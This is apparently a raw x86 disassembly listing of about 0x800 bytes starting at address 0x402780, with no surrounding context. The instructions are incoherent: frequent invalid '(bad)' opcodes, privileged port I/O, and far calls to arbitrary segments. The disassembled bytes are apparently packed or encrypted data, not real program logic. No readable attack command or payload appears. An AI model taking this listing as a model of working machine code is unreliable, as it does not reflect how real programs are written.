  402780:	ror    DWORD PTR [esi],0xe8
  402783:	mov    DWORD PTR [ebx],eax
  402785:	xor    al,0x44
  402787:	sbb    ecx,DWORD PTR [edi+eax*4+0x594d1d83]
  40278e:	mov    ds:0x8e018005,eax
  402793:	ins    DWORD PTR es:[edi],dx
  402794:	stc    
  402795:	and    DWORD PTR [ebp+0x70],edi
  402798:	mov    edi,0x44e5c20
  40279d:	mov    ch,BYTE PTR [edx-0x68e52cce]
  4027a3:	fnstsw ax
  4027a5:	je     0x402753
  4027a7:	ror    BYTE PTR [esi-0x2f],cl
  4027aa:	(bad)  
  4027ab:	loop   0x402810
  4027ad:	push   ss
  4027ae:	shl    BYTE PTR [ecx-0x5],1
  4027b1:	call   0x7faf:0x23c32f72
  4027b8:	imul   edx,DWORD PTR [ecx+0x1d53aa54],0xffffffcc
  4027bf:	sar    DWORD PTR [edx+0x7670f5b7],0xec
  4027c6:	shl    BYTE PTR [esi],0x40
  4027c9:	sub    BYTE PTR [edx],bl
  4027cb:	fisubr WORD PTR [ebx]
  4027cd:	retf   0xb3eb
  4027d0:	pop    esp
  4027d1:	lods   eax,DWORD PTR ds:[esi]
  4027d2:	in     al,dx
  4027d3:	mov    ah,0xf3
  4027d5:	sar    ch,1
  4027d7:	popa   
  4027d8:	dec    esi
  4027d9:	cmp    al,0xe8
  4027db:	mov    DWORD PTR [edx],edi
  4027dd:	mov    eax,0x8eefa154
  4027e2:	in     eax,0xf8
  4027e4:	mov    cl,BYTE PTR [ebp+0x1a3600f8]
  4027ea:	add    DWORD PTR [ebp-0x5b326f10],0x60
  4027f1:	sub    DWORD PTR [esi],ecx
  4027f3:	popf   
  4027f4:	adc    al,0x4e
  4027f6:	scas   al,BYTE PTR es:[edi]
  4027f7:	sbb    al,0x82
  4027f9:	dec    edx
  4027fa:	mov    dl,0x15
  4027fc:	sub    eax,0xeee4291f
  402801:	call   0xe7a6:0x253d2d90
  402808:	rol    BYTE PTR [edx],0xbb
  40280b:	lods   eax,DWORD PTR ds:[esi]
  40280c:	mov    esp,0x5d34ddea
  402811:	call   0x2b70a5a8
  402816:	mov    ebx,0x78d4e828
  40281b:	push   cs
  40281c:	adc    DWORD PTR [ebx+ebp*2-0xea8ad8e],ebp
  402823:	in     al,0xe3
  402825:	shl    DWORD PTR [ebx+0x53d9ceb0],1
  40282b:	jno    0x402856
  40282d:	into   
  40282e:	pushf  
  40282f:	outs   dx,DWORD PTR ds:[esi]
  402830:	pop    edi
  402831:	popf   
  402832:	(bad)  
  402833:	or     al,0xa4
  402835:	push   cs
  402836:	xchg   ebx,eax
  402837:	inc    esi
  402838:	jmp    FWORD PTR [ebx]
  40283a:	add    al,0xf8
  40283c:	(bad)  
  40283d:	dec    ecx
  40283e:	rol    DWORD PTR [ecx],0xb8
  402841:	push   edx
  402842:	cmp    cl,BYTE PTR [esi+eax*4+0x55214ff8]
  402849:	dec    ebx
  40284a:	mov    DWORD PTR [esi+0x697583f0],ecx
  402850:	inc    eax
  402851:	ret    
  402852:	lahf   
  402853:	inc    esp
  402854:	in     eax,0xf2
  402856:	xchg   ebp,eax
  402857:	dec    edx
  402858:	aaa    
  402859:	fs daa 
  40285b:	jbe    0x402882
  40285d:	jmp    0x92821780
  402862:	mov    esi,0xf64a7ec1
  402867:	aad    0x28
  402869:	xor    ecx,DWORD PTR [edx-0x6b]
  40286c:	cmp    edi,DWORD PTR [edi-0x7bad2cd6]
  402872:	inc    esp
  402873:	jnp    0x4027fc
  402875:	ds inc edi
  402877:	test   DWORD PTR [esi*4-0x46bcd8af],0xea3dbb42
  402882:	jo     0x4028df
  402884:	bt     DWORD PTR [eax+0xa],edi
  402888:	mov    BYTE PTR [edx],cl
  40288a:	les    eax,FWORD PTR [edx]
  40288c:	rol    DWORD PTR [edx-0x38da32b9],cl
  402892:	out    0x1e,eax
  402894:	icebp  
  402895:	adc    edi,DWORD PTR [ebp-0x36]
  402898:	sar    BYTE PTR [edi+edx*1-0x33],1
  40289c:	mov    al,ds:0xb4ae9a44
  4028a1:	mov    dh,0x2b
  4028a3:	lock mov ds:0xa01ac0be,eax
  4028a9:	stos   BYTE PTR es:[edi],al
  4028aa:	sahf   
  4028ab:	retf   
  4028ac:	cld    
  4028ad:	pop    es
  4028ae:	repnz and BYTE PTR [ebx+ebx*8+0x16],bh
  4028b3:	adc    ebp,edx
  4028b5:	loope  0x4028b9
  4028b7:	fst    QWORD PTR [esi+0x22]
  4028ba:	jmp    0x4028e3
  4028bc:	pop    ebp
  4028bd:	loopne 0x402867
  4028bf:	or     ebp,DWORD PTR [eax-0x79]
  4028c2:	idiv   DWORD PTR [ebp-0x63]
  4028c5:	xor    edx,DWORD PTR [esp+edx*4-0x15]
  4028c9:	cmc    
  4028ca:	adc    cl,bl
  4028cc:	mov    cl,BYTE PTR ds:0x476b6e63
  4028d3:	pop    ecx
  4028d4:	cs dec edx
  4028d6:	mov    ds:0x91f43421,eax
  4028db:	or     eax,0x7437f03a
  4028e0:	daa    
  4028e1:	hlt    
  4028e2:	dec    ebp
  4028e3:	aam    0x9f
  4028e5:	dec    eax
  4028e6:	add    DWORD PTR [ebx],edi
  4028e8:	add    eax,0xf5ce116a
  4028ed:	pop    esi
  4028ee:	in     eax,0xa1
  4028f0:	adc    DWORD PTR [edi-0x6a],esp
  4028f3:	pushf  
  4028f4:	jbe    0x402881
  4028f6:	stos   DWORD PTR es:[edi],eax
  4028f7:	dec    ecx
  4028f8:	fcomp  QWORD PTR [ebx+ebx*8]
  4028fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028fc:	push   esp
  4028fd:	nop
  4028fe:	rcl    DWORD PTR [edx],1
  402900:	sahf   
  402901:	inc    eax
  402902:	and    eax,0x9ab4477b
  402907:	ja     0x402957
  402909:	sbb    BYTE PTR [ebx],bh
  40290b:	ficom  WORD PTR [esi]
  40290d:	mov    dh,dh
  40290f:	push   edx
  402910:	sbb    eax,0x71bd0f53
  402915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402916:	mov    ecx,0xf6e3b993
  40291b:	jge    0x4028b7
  40291d:	icebp  
  40291e:	mov    al,ds:0x3d3ae5fb
  402923:	pop    ds
  402924:	push   ds
  402925:	and    al,0xb
  402927:	jno    0x402940
  402929:	test   BYTE PTR [esi],dh
  40292b:	xchg   ebx,eax
  40292c:	loop   0x4028d4
  40292e:	sahf   
  40292f:	dec    edx
  402930:	sub    BYTE PTR [edx+ecx*4],ah
  402933:	pop    ss
  402934:	sub    DWORD PTR [esi-0x4c7a2fcf],ecx
  40293a:	out    dx,al
  40293b:	repnz cwde 
  40293d:	cmp    BYTE PTR [edx+0x5f6caf3e],cl
  402943:	inc    ebx
  402944:	fs push 0x448e899a
  40294a:	xchg   edx,eax
  40294b:	dec    eax
  40294c:	ja     0x402919
  40294e:	outs   dx,BYTE PTR ds:[esi]
  40294f:	push   ecx
  402950:	inc    edx
  402951:	cld    
  402952:	(bad)  
  402953:	jmp    0x313794c3
  402958:	mov    bh,0xc6
  40295a:	jge    0x402947
  40295c:	std    
  40295d:	in     al,0xd8
  40295f:	aas    
  402960:	jmp    0x402975
  402962:	sbb    bl,BYTE PTR [edx]
  402964:	daa    
  402965:	(bad)  
  402966:	sub    cl,cl
  402968:	and    ecx,DWORD PTR [edx]
  40296a:	pop    ebp
  40296b:	out    0x4c,eax
  40296d:	pop    edi
  40296e:	test   BYTE PTR [ecx+0x40],dl
  402971:	inc    esi
  402972:	bnd jno 0x4029b2
  402975:	push   cs
  402976:	outs   dx,DWORD PTR ds:[esi]
  402977:	inc    ebx
  402978:	or     DWORD PTR [ecx+edi*4-0xcc5e84b],eax
  40297f:	enter  0xdbb7,0x5f
  402983:	inc    eax
  402984:	push   edx
  402985:	in     eax,0xe1
  402987:	pop    es
  402988:	pushf  
  402989:	test   BYTE PTR [esi],cl
  40298b:	pop    esi
  40298c:	jns    0x40292e
  40298e:	or     BYTE PTR [edx],dh
  402990:	inc    eax
  402991:	(bad)  
  402992:	out    dx,al
  402993:	in     al,0x52
  402995:	xor    al,BYTE PTR [esi+0x28975166]
  40299b:	clc    
  40299c:	stos   BYTE PTR es:[edi],al
  40299d:	fsub   QWORD PTR [esi-0x71dc1054]
  4029a3:	jns    0x40295e
  4029a5:	dec    esi
  4029a6:	rcr    BYTE PTR ds:0x7331eb30,1
  4029ac:	mov    BYTE PTR [eax],cl
  4029ae:	pushf  
  4029af:	jae    0x402a06
  4029b1:	jmp    0x40299c
  4029b3:	into   
  4029b4:	ror    ebx,1
  4029b6:	mov    ds:0xd7e323aa,al
  4029bb:	sbb    eax,0xf024faf8
  4029c0:	out    0x91,eax
  4029c2:	outs   dx,BYTE PTR ds:[esi]
  4029c3:	pop    es
  4029c4:	add    esp,ebx
  4029c6:	mov    bh,0xac
  4029c8:	add    esp,DWORD PTR [edi-0xaf07d39]
  4029ce:	lock sub BYTE PTR [ebx],bh
  4029d1:	loop   0x40298e
  4029d3:	es leave 
  4029d5:	(bad)  
  4029d6:	aaa    
  4029d7:	test   BYTE PTR [esi+0x8e29d3f],0xa8
  4029de:	fsubr  QWORD PTR [edi-0x35390678]
  4029e4:	pop    ebp
  4029e5:	dec    ecx
  4029e6:	push   ebx
  4029e7:	jno    0x402a46
  4029e9:	adc    DWORD PTR [edx+0x6],esp
  4029ec:	pop    ebx
  4029ed:	leave  
  4029ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029ef:	xchg   ebp,eax
  4029f0:	dec    ebx
  4029f1:	mov    cl,0xa7
  4029f3:	mov    esi,0xedc20e08
  4029f8:	dec    esp
  4029f9:	and    al,0xf2
  4029fb:	inc    eax
  4029fc:	sahf   
  4029fd:	add    BYTE PTR [ebp+0x294cf1aa],dh
  402a03:	dec    esp
  402a04:	dec    ebp
  402a05:	scas   al,BYTE PTR es:[edi]
  402a06:	mov    al,ds:0x467d482b
  402a0b:	fidiv  WORD PTR [ebp+0x2a]
  402a0e:	in     eax,dx
  402a0f:	or     BYTE PTR [esi+0x1e9718fa],cl
  402a15:	std    
  402a16:	sbb    bh,BYTE PTR [ebx]
  402a18:	xor    ecx,DWORD PTR [edx]
  402a1a:	dec    DWORD PTR [ebp+0x58827c4e]
  402a20:	leave  
  402a21:	in     eax,0x21
  402a23:	pushf  
  402a24:	cmp    BYTE PTR [ecx+esi*2+0x6d],ah
  402a28:	push   cs
  402a29:	rcl    BYTE PTR [ebx-0x80],0xe6
  402a2d:	sbb    bl,BYTE PTR [edx+0x16]
  402a30:	mov    dl,0x30
  402a32:	xchg   al,dl
  402a34:	sbb    BYTE PTR [ecx+edi*2+0x134fff41],dh
  402a3b:	imul   esi,DWORD PTR [edx+0x17],0xffffffe0
  402a3f:	(bad)  
  402a40:	dec    esi
  402a41:	sub    edi,0x7e3da598
  402a47:	pop    esp
  402a48:	xor    dh,ah
  402a4a:	test   DWORD PTR [ebp+ecx*4-0x76],ebx
  402a4e:	mov    bh,0xdb
  402a50:	push   edi
  402a51:	xor    DWORD PTR [ecx+0x5d59ae9d],esp
  402a57:	into   
  402a58:	xor    al,0x97
  402a5a:	jno    0x402a7a
  402a5c:	jle    0x402a99
  402a5e:	retf   0x1367
  402a61:	and    eax,0x2d57f7b0
  402a66:	push   ebp
  402a67:	mov    ebx,0xff0a31ff
  402a6c:	das    
  402a6d:	repnz sbb al,0xcd
  402a70:	rol    DWORD PTR [eax+0x4],cl
  402a73:	out    0x7b,al
  402a75:	(bad)  
  402a76:	(bad)  
  402a77:	or     BYTE PTR [edi-0x2a],0x31
  402a7b:	mov    ds:0xae9af12,al
  402a81:	shl    ch,1
  402a83:	dec    esp
  402a84:	xor    DWORD PTR [edx+0x2d],esi
  402a87:	push   0x582fde90
  402a8c:	iret   
  402a8d:	sub    eax,0x45e401ec
  402a92:	mov    dh,cl
  402a94:	add    eax,0x94e6a594
  402a99:	dec    ebp
  402a9a:	out    dx,eax
  402a9b:	jns    0x402ac6
  402a9d:	ins    BYTE PTR es:[edi],dx
  402a9e:	sub    ah,dh
  402aa0:	loope  0x402acc
  402aa2:	add    ch,BYTE PTR [ecx-0x21]
  402aa5:	adc    ah,BYTE PTR [edx-0x18182f32]
  402aab:	push   0x54
  402aad:	push   ebp
  402aae:	push   ebx
  402aaf:	call   0x2709:0x8e89fffe
  402ab6:	mov    DWORD PTR [edx+0x2b],ebx
  402ab9:	add    dl,ah
  402abb:	mov    edi,0x24bd37a0
  402ac0:	ret    0xf2fd
  402ac3:	jg     0x402b1b
  402ac5:	push   DWORD PTR [edx]
  402ac7:	retf   
  402ac8:	and    al,0x31
  402aca:	push   ds
  402acb:	nop
  402acc:	pop    es
  402acd:	lahf   
  402ace:	je     0x402af0
  402ad0:	mov    BYTE PTR [ecx+0x4375ba89],bh
  402ad6:	loop   0x402a8c
  402ad8:	rcr    al,cl
  402ada:	ret    
  402adb:	ds retf 
  402add:	sub    eax,0xdfca4e0
  402ae2:	mov    BYTE PTR [ebx-0x4afcd49f],bl
  402ae8:	popf   
  402ae9:	in     al,dx
  402aea:	fmul   DWORD PTR [eax+0x41]
  402aed:	iret   
  402aee:	mov    dl,0x72
  402af0:	std    
  402af1:	inc    edx
  402af2:	jne    0x402a74
  402af4:	jmp    0xa97e7bee
  402af9:	(bad)  
  402afa:	in     al,0x9f
  402afc:	aad    0x9e
  402afe:	sbb    DWORD PTR [ebp+0xb],ecx
  402b01:	test   DWORD PTR [ebx],ebx
  402b03:	mov    eax,0x2dfa5403
  402b08:	pop    ecx
  402b09:	in     eax,0x89
  402b0b:	imul   esi,ebx,0xdd35ae09
  402b11:	lahf   
  402b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b13:	das    
  402b14:	call   0x9051:0xad22fcb3
  402b1b:	retf   0xe6a0
  402b1e:	or     al,0x9d
  402b20:	mov    ds:0xd0118ad2,al
  402b25:	fistp  QWORD PTR [eax-0x2903972d]
  402b2b:	mov    eax,ds:0x4e04d031
  402b30:	popa   
  402b31:	jo     0x402b26
  402b33:	push   edx
  402b34:	dec    ebx
  402b35:	and    al,0xd9
  402b37:	into   
  402b38:	xor    bl,ch
  402b3a:	sbb    eax,0x943b4390
  402b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b40:	xchg   ebp,eax
  402b41:	push   edi
  402b42:	mov    bl,0xdc
  402b44:	pop    ss
  402b45:	push   0x8d8d8e2a
  402b4a:	fmul   DWORD PTR [edi+0x790ed4c4]
  402b50:	inc    esi
  402b51:	loopne 0x402b7d
  402b53:	gs xchg esi,eax
  402b55:	call   0x85fc:0x77498e37
  402b5c:	xchg   ebp,eax
  402b5d:	sbb    eax,0x213cd6b2
  402b62:	mov    dl,0xf7
  402b64:	(bad)  
  402b65:	jno    0x402b70
  402b67:	in     eax,dx
  402b68:	inc    esp
  402b69:	mov    eax,ds:0x9927794c
  402b6e:	daa    
  402b6f:	call   0xb1ed:0x14878fa6
  402b76:	xchg   ebx,eax
  402b77:	sbb    eax,0x8df734da
  402b7c:	jnp    0x402be4
  402b7e:	ja     0x402b0a
  402b80:	into   
  402b81:	call   0x6606:0x8bfbcfab
  402b88:	cdq    
  402b89:	mov    esi,0xfb941cf
  402b8e:	mov    bl,0x97
  402b90:	fmul   st,st(5)
  402b92:	out    0xbd,al
  402b94:	das    
  402b95:	std    
  402b96:	add    bl,BYTE PTR [ecx+0x6895f758]
  402b9c:	xchg   ebx,eax
  402b9d:	inc    eax
  402b9e:	aas    
  402b9f:	scas   al,BYTE PTR es:[edi]
  402ba0:	std    
  402ba1:	and    al,0x42
  402ba3:	xlat   BYTE PTR ds:[ebx]
  402ba4:	sub    edx,eax
  402ba6:	sub    ch,BYTE PTR [esi+0x2b6a7455]
  402bac:	push   ss
  402bad:	sbb    BYTE PTR [edi+0x78],0xa8
  402bb1:	repnz int 0xd4
  402bb4:	dec    ebp
  402bb5:	xor    eax,0x9ac8e24e
  402bba:	adc    edx,DWORD PTR [edx]
  402bbc:	push   ss
  402bbd:	fidiv  WORD PTR [edi+0x3b4cbe9f]
  402bc3:	adc    ebp,DWORD PTR [esi]
  402bc5:	mov    bl,0x5c
  402bc7:	test   BYTE PTR [ecx],bl
  402bc9:	nop
  402bca:	out    0xbe,al
  402bcc:	dec    edi
  402bcd:	sbb    DWORD PTR [ebx],edx
  402bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bd0:	int    0x74
  402bd2:	fimul  DWORD PTR [edx]
  402bd4:	mov    edx,0xddf9f220
  402bd9:	cwde   
  402bda:	sub    BYTE PTR [edi+0x31],ah
  402bdd:	shl    BYTE PTR [ecx],1
  402bdf:	xchg   ecx,eax
  402be1:	and    ecx,DWORD PTR [eax+edx*4]
  402be4:	popa   
  402be5:	xchg   esi,eax
  402be6:	(bad)  
  402be7:	cld    
  402be8:	mov    esp,0x1d4b1b7d
  402bed:	mov    esp,esi
  402bef:	lods   al,BYTE PTR ds:[esi]
  402bf0:	sbb    BYTE PTR [ecx-0x7e568b3e],ch
  402bf6:	cld    
  402bf7:	(bad)  
  402bf8:	pop    edi
  402bf9:	aas    
  402bfa:	stc    
  402bfb:	popf   
  402bfc:	jbe    0x402c06
  402bfe:	sbb    BYTE PTR [ecx-0x2a03ddd2],dl
  402c04:	pop    edi
  402c05:	fld    DWORD PTR [edi+0x3d]
  402c08:	push   ss
  402c09:	push   esi
  402c0a:	loop   0x402b98
  402c0c:	pop    ss
  402c0d:	dec    edi
  402c0e:	out    0xa3,eax
  402c10:	sub    ecx,eax
  402c12:	and    eax,0x8e2b9ff3
  402c17:	jno    0x402bdf
  402c19:	or     eax,0xff5ce0b4
  402c1e:	fcom   QWORD PTR [edx+0x59]
  402c21:	scas   al,BYTE PTR es:[edi]
  402c22:	xlat   BYTE PTR ds:[ebx]
  402c23:	fs test al,0xcf
  402c26:	push   cs
  402c27:	ret    0x2e66
  402c2a:	xchg   DWORD PTR [ebx+0x4b],ebx
  402c2d:	pop    ss
  402c2e:	dec    DWORD PTR [edx-0x18617d3a]
  402c34:	hlt    
  402c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c36:	jo     0x402c30
  402c38:	stos   BYTE PTR es:[edi],al
  402c39:	call   0x1fb7:0x2b57f5f7
  402c40:	call   0xd8171a50
  402c45:	push   0xffffffc5
  402c47:	xlat   BYTE PTR ds:[ebx]
  402c48:	inc    edi
  402c49:	fld    DWORD PTR [eax+0x4c22005a]
  402c4f:	out    dx,al
  402c50:	xchg   edx,eax
  402c51:	fwait
  402c52:	add    BYTE PTR [ecx],dh
  402c54:	aam    0xcc
  402c56:	jne    0x402c8f
  402c58:	outs   dx,BYTE PTR ds:[esi]
  402c59:	cmp    eax,0x34b90433
  402c5e:	mov    al,0x25
  402c60:	adc    eax,0x12e92f81
  402c65:	xchg   BYTE PTR [ecx],cl
  402c67:	es stc 
  402c69:	mov    dl,0x95
  402c6b:	pop    ds
  402c6c:	sub    BYTE PTR [edi-0xf972a2a],0xe6
  402c73:	sahf   
  402c74:	push   ecx
  402c75:	xchg   BYTE PTR [esi],cl
  402c77:	jmp    0x491585d5
  402c7c:	cmc    
  402c7d:	outs   dx,BYTE PTR ds:[esi]
  402c7e:	mov    ebx,0x2bbe2a90
  402c83:	jmp    0x4fab:0x87aeb3f3
  402c8a:	dec    esi
  402c8b:	fstp   st(5)
  402c8e:	cmp    BYTE PTR [ebp+0x7e],dl
  402c91:	aas    
  402c92:	int3   
  402c93:	xor    DWORD PTR [ecx-0x7e785417],esi
  402c99:	std    
  402c9a:	cwde   
  402c9b:	xor    BYTE PTR [ecx],ah
  402c9d:	frstor [ecx]
  402c9f:	daa    
  402ca0:	les    edi,FWORD PTR [edi-0x19]
  402ca3:	lds    esi,FWORD PTR [ebx-0x3e652979]
  402ca9:	push   ebp
  402caa:	out    0x6e,eax
  402cac:	and    edi,DWORD PTR [edi]
  402cae:	dec    esp
  402caf:	jo     0x402cb8
  402cb1:	push   edx
  402cb2:	adc    edi,DWORD PTR [edi+0xa493598]
  402cb8:	out    dx,al
  402cb9:	inc    esi
  402cba:	dec    eax
  402cbb:	ins    DWORD PTR es:[edi],dx
  402cbc:	mov    ah,0x3f
  402cbe:	xchg   edi,eax
  402cbf:	jns    0x402d32
  402cc1:	sub    BYTE PTR ds:0x834c8e18,dh
  402cc7:	imul   esi,ecx,0x10
  402cca:	and    eax,0xa496e319
  402ccf:	loopne 0x402c96
  402cd1:	imul   eax,DWORD PTR [esi+0x24],0xc6652c72
  402cd8:	mov    ecx,0xb73c85d
  402cdd:	push   edi
  402cde:	and    ebx,DWORD PTR [esi]
  402ce0:	adc    BYTE PTR [ecx],ch
  402ce2:	fiadd  WORD PTR [edx+ebp*4]
  402ce5:	shl    BYTE PTR [esi+eax*2-0x9],cl
  402ce9:	inc    esi
  402cea:	pushf  
  402ceb:	xor    al,BYTE PTR [edi-0x48a764e4]
  402cf1:	(bad)  
  402cf2:	daa    
  402cf3:	add    BYTE PTR [esi-0x10],cl
  402cf6:	test   eax,0xaf5d53cc
  402cfb:	or     al,BYTE PTR [edi+esi*2-0x1f]
  402cff:	inc    dl
  402d01:	ins    DWORD PTR es:[edi],dx
  402d02:	adc    edi,esi
  402d04:	push   cs
  402d05:	fs loop 0x402d12
  402d08:	ret    0xd98f
  402d0b:	je     0x402d20
  402d0d:	mov    edx,0x6f8f57f6
  402d12:	jmp    0xabc31c66
  402d17:	push   ecx
  402d18:	add    BYTE PTR [edi-0x79e724f5],0x78
  402d1f:	js     0x402d8b
  402d21:	jge    0x402d5f
  402d23:	arpl   WORD PTR [eax-0x2c9bc092],bp
  402d29:	and    BYTE PTR [ebx+0x40af76f7],0x17
  402d30:	push   0x9173b8ae
  402d35:	ds push eax
  402d37:	cmp    eax,0xf563a33c
  402d3c:	mov    ds:0x57429450,al
  402d41:	in     al,0x9d
  402d43:	jb     0x402d5c
  402d45:	scas   eax,DWORD PTR es:[edi]
  402d46:	mov    ah,0xc1
  402d48:	sar    ah,cl
  402d4a:	fnstsw WORD PTR [ebx+0x2e10b656]
  402d50:	lds    ebp,FWORD PTR [eax-0x5966fe0b]
  402d56:	jg     0x402d32
  402d58:	repnz mov esi,0xf28f2da8
  402d5e:	cli    
  402d5f:	pop    eax
  402d60:	mov    esi,0xb1eaf956
  402d65:	jl     0x402d3f
  402d67:	jg     0x402dd5
  402d69:	push   edx
  402d6a:	jle    0x402d91
  402d6c:	ret    
  402d6d:	pop    ss
  402d6e:	add    ebp,DWORD PTR [edi]
  402d70:	psllq  mm3,mm1
  402d73:	push   0xffffffbf
  402d75:	push   esp
  402d76:	cmp    BYTE PTR [ebp-0x54],0x7d
  402d7a:	daa    
  402d7b:	mov    ah,0xf9
  402d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d7e:	jb     0x402ddf
  402d80:	sbb    al,0x58
  402d82:	inc    BYTE PTR [eax+ebx*1-0x2d]
  402d86:	fxch   st(4)
  402d88:	das    
  402d89:	cdq    
  402d8a:	ret    
  402d8b:	jecxz  0x402d26
  402d8d:	xchg   esi,eax
  402d8e:	xor    BYTE PTR [edi],dh
  402d90:	lods   al,BYTE PTR ds:[esi]
  402d91:	and    eax,0xceea8f68
  402d96:	popf   
  402d97:	ret    0xc387
  402d9a:	inc    esi
  402d9b:	not    BYTE PTR [edi+0x19]
  402d9e:	or     al,0x2d
  402da0:	mov    dl,0xf1
  402da2:	adc    BYTE PTR [ebp-0x8],al
  402da5:	not    BYTE PTR [ebx+0x60]
  402da8:	clc    
  402da9:	mov    ecx,0x21be3960
  402dae:	shl    edx,cl
  402db0:	xchg   edx,eax
  402db1:	leave  
  402db2:	daa    
  402db3:	inc    ebp
  402db4:	jge    0x402da3
  402db6:	and    eax,0x10d0d58e
  402dbb:	shr    BYTE PTR [ecx],1
  402dbd:	inc    eax
  402dbe:	fsubp  st(5),st
  402dc0:	pop    ss
  402dc1:	aam    0xf1
  402dc3:	cmp    ch,BYTE PTR [ecx+0x6a]
  402dc6:	sub    DWORD PTR [edi],0x7f
  402dc9:	imul   esi,DWORD PTR [ebx+0x62e9edd4],0xf0963c22
  402dd3:	ds ins DWORD PTR es:[edi],dx
  402dd5:	loopne 0x402dda
  402dd7:	dec    ecx
  402dd8:	(bad)  
  402dd9:	out    0xf6,al
  402ddb:	ret    0x817f
  402dde:	mov    dh,cl
  402de0:	sub    dh,BYTE PTR [edx]
  402de2:	aaa    
  402de3:	(bad)  
  402de4:	ins    DWORD PTR es:[edi],dx
  402de5:	addr16 js 0x402e08
  402de8:	inc    eax
  402de9:	neg    DWORD PTR [eax-0x40]
  402dec:	pop    esi
  402ded:	dec    ecx
  402dee:	mov    eax,ds:0xa42e8f20
  402df3:	pop    esp
  402df4:	lock sbb al,0xa1
  402df7:	es dec esp
  402df9:	fdiv   DWORD PTR [ebx-0x6b94ca3a]
  402dff:	js     0x402e30
  402e01:	fisttp WORD PTR [edx-0x5d]
  402e04:	pop    esp
  402e05:	ror    al,0xf3
  402e08:	cmp    dl,bl
  402e0a:	daa    
  402e0b:	pusha  
  402e0c:	fdivp  st(7),st
  402e0e:	in     al,0x7d
  402e10:	push   0x4a5bcb2
  402e15:	push   ebx
  402e16:	and    eax,0xd3c0586b
  402e1b:	fldcw  WORD PTR [ebx]
  402e1d:	ds int 0x24
  402e20:	adc    edx,esp
  402e22:	cmp    eax,0x9f3dcc4f
  402e27:	ds (bad) 
  402e29:	in     eax,0x18
  402e2b:	cmp    BYTE PTR [esi+0x104b7818],ch
  402e31:	ret    0x806
  402e34:	adc    dh,al
  402e36:	aad    0xbe
  402e38:	lock or BYTE PTR [edx-0x61b6bbb9],ah
  402e3f:	cwde   
  402e40:	mov    esp,DWORD PTR [eax-0x42]
  402e43:	out    0xeb,eax
  402e45:	cmp    al,BYTE PTR [edx-0x35aee01d]
  402e4b:	jle    0x402eae
  402e4d:	push   edx
  402e4e:	mov    bh,0x87
  402e50:	xor    al,0xed
  402e52:	sub    dl,BYTE PTR [edx-0x66]
  402e55:	xchg   edx,eax
  402e56:	mov    bl,0xc8
  402e58:	popf   
  402e59:	call   0xec83:0xb2e92d45
  402e60:	push   0x62
  402e62:	aam    0xce
  402e64:	mov    ah,ah
  402e66:	jb     0x402eb9
  402e68:	xchg   ebp,eax
  402e69:	inc    edx
  402e6a:	(bad)  
  402e6b:	xor    esp,ecx
  402e6d:	test   eax,0x2c360013
  402e72:	mov    ds,WORD PTR [esi+0x57]
  402e75:	fcmovb st,st(2)
  402e77:	xchg   BYTE PTR [ecx],bl
  402e79:	scas   eax,DWORD PTR es:[edi]
  402e7a:	ret    0x3767
  402e7d:	or     al,0x30
  402e7f:	add    DWORD PTR [eax+0x48],0xffffff9f
  402e83:	sub    eax,0x10a7a92e
  402e88:	xchg   esp,eax
  402e89:	ds pop edx
  402e8b:	lds    ecx,FWORD PTR [ebx]
  402e8d:	mov    bh,ah
  402e8f:	adc    eax,ebx
  402e91:	lods   al,BYTE PTR ds:[esi]
  402e92:	sub    dx,si
  402e95:	stc    
  402e96:	jmp    0xbe9665fe
  402e9b:	push   ebp
  402e9c:	mov    ch,BYTE PTR [edx+0x851431c]
  402ea2:	out    dx,al
  402ea3:	inc    al
  402ea5:	mov    WORD PTR [esi+0x7d],?
  402ea8:	sub    eax,0x37d5a3f4
  402ead:	jbe    0x402e72
  402eaf:	cld    
  402eb0:	pop    esi
  402eb1:	add    DWORD PTR [ebx-0x67],ebp
  402eb4:	push   edx
  402eb5:	jne    0x402e49
  402eb7:	lods   eax,DWORD PTR ds:[esi]
  402eb8:	icebp  
  402eb9:	sbb    eax,0x32558133
  402ebe:	mov    dh,0x15
  402ec0:	mov    ebp,edx
  402ec2:	lock sub DWORD PTR [ecx],esi
  402ec5:	sbb    DWORD PTR [ebx],0x43
  402ec8:	mov    ds:0x360ac210,eax
  402ecd:	sti    
  402ece:	outs   dx,DWORD PTR ds:[esi]
  402ecf:	push   esi
  402ed0:	lods   al,BYTE PTR ds:[esi]
  402ed1:	fmul   DWORD PTR [ebx+edx*4]
  402ed4:	pop    esi
  402ed5:	adc    eax,0xda08b0fe
  402eda:	mov    ah,0xe6
  402edc:	cdq    
  402edd:	or     ch,dl
  402edf:	dec    ecx
  402ee0:	fidiv  WORD PTR [edx]
  402ee2:	test   eax,0xa17d4a4f
  402ee7:	mov    ecx,0xbd8fde25
  402eec:	fcom   QWORD PTR [esi-0x6c3f4943]
  402ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ef3:	or     DWORD PTR [ebp-0x7b],ebx
  402ef6:	cdq    
  402ef7:	int    0xe8
  402ef9:	(bad)  
  402efa:	sbb    eax,0xad816e40
  402eff:	mov    esp,0xac2afa99
  402f04:	sti    
  402f05:	adc    ah,BYTE PTR ds:0xe66d239b
  402f0b:	loop   0x402f88
  402f0d:	test   esi,edi
  402f0f:	pop    ebp
  402f10:	(bad)  
  402f11:	sub    edi,DWORD PTR [ecx+0x2f]
  402f14:	push   ecx
  402f15:	mov    eax,ds:0x386024e5
  402f1a:	cmp    bl,BYTE PTR [eax+0x76]
  402f1d:	sub    edi,DWORD PTR [edx]
  402f1f:	sbb    ch,BYTE PTR [esi+0x34]
  402f22:	pop    ebp
  402f23:	sbb    ecx,DWORD PTR [edi-0x23ae3366]
  402f29:	(bad)  
  402f2b:	and    BYTE PTR [ebp+0x5e],dl
  402f2e:	jb     0x402efa
  402f30:	aas    
  402f31:	lea    edx,[edi+ebp*8-0x1b]
  402f35:	js     0x402eed
  402f37:	les    esi,FWORD PTR [edx+0x78869615]
  402f3d:	in     al,0x7
  402f3f:	cs jmp 0x402ee6
  402f42:	lds    edx,FWORD PTR [ebx-0x130fcbc3]
